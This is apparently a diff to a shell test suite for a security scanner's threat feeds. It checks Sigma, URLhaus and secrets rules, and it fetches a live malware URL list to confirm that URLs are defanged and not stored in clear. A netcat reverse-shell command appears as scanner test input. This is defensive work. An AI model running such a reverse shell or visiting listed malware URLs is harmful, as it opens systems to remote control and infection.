@@ -33,8 +33,11 @@ FS="$("$SHIM" feeds status </dev/null 2>&1)"; printf '%s' "$FS" | grep -q "NOT o
 [ -f "$HOME/.blitz/feeds/commands/rules.json" ] && ok "opt-in also installed the commands feed (Sigma, $(grep -o '"rules":[0-9]*' "$HOME/.blitz/feeds/commands/manifest.json"))" || no "commands feed missing"
 "$SHIM" feeds scan 'nc -e /bin/sh 10.0.0.1 4444' </dev/null 2>&1 | grep -q "Netcat Reverse Shell" && ok "feeds scan flags a reverse shell (Sigma)" || no "Sigma scan missed the reverse shell"
 [ -f "$HOME/.blitz/feeds/urls/rules.json" ] && ok "opt-in also installed the urls feed (URLhaus, $(grep -o '"rules":[0-9]*' "$HOME/.blitz/feeds/urls/manifest.json") URLs)" || no "urls feed missing"
-LISTED="$(grep -v '^#' "$HOME/.blitz/feeds/urls/source.raw" | head -1)"
-"$SHIM" feeds scan "echo $LISTED" </dev/null 2>&1 | grep -q "URLhaus" && ok "feeds scan flags a listed URL ($LISTED)" || no "URL scan missed $LISTED"
+LISTED="$(curl -fsSL https://urlhaus.abuse.ch/downloads/text_online/ | grep -v '^#' | grep -v -i github | head -1)"
+"$SHIM" feeds scan "echo $LISTED" </dev/null 2>&1 | grep -q "hxxp" && ok "feeds scan flags a listed URL and prints it defanged" || no "URL scan missed the listed URL or printed it in clear"
+HOSTPART="$(printf '%s' "$LISTED" | sed -E 's#^[a-z]+://##; s#[/:].*##')"
+grep -rq -- "$HOSTPART" "$HOME/.blitz/feeds/" && no "the listed host appears in clear text under ~/.blitz/feeds (antivirus bait)" || ok "nothing under ~/.blitz/feeds carries a listed URL in clear (hashed, no raw source)"
+[ -e "$HOME/.blitz/feeds/urls/source.raw" ] && no "raw URL list kept on disk" || ok "raw source not retained"
 "$SHIM" feeds scan 'curl https://raw.githubusercontent.com/oven-sh/bun/main/README.md' </dev/null 2>&1 | grep -q "nothing flagged" && ok "a GitHub raw URL is not host-blocked (shared platform)" || no "shared platform host was flagged"
 "$SHIM" feeds opt-out </dev/null >/dev/null 2>&1 && [ ! -e "$HOME/.blitz/feeds/opt-in" ] && [ -f "$HOME/.blitz/feeds/secrets/rules.json" ] && ok "opt-out keeps files, drops consent" || no "opt-out state wrong"
 
